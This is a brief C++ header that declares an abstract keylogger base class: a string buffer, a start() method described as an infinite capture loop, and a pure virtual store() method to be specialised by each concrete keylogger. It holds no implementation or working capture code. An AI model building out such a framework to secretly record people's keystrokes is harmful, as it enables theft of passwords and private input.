#ifndef _KEYLOGGER_HPP_
#define _KEYLOGGER_HPP_

using namespace std;

class keylogger
{
    public :
  		string* a_buffer;
  		int a_buffer_maximum_size;

    /*
    * Default constructor
    */
		keylogger();

    /*
    * Destructor
    */
		virtual ~keylogger();

    /*
    * do an infinite loop and store and call method store
    */
    virtual void start();

    /*
    * ABSTRACT METHOD
    *
    * This method is called to store entry, need to be redifined for each specific keylogger
    */
		virtual void store() = 0;

};

#endif
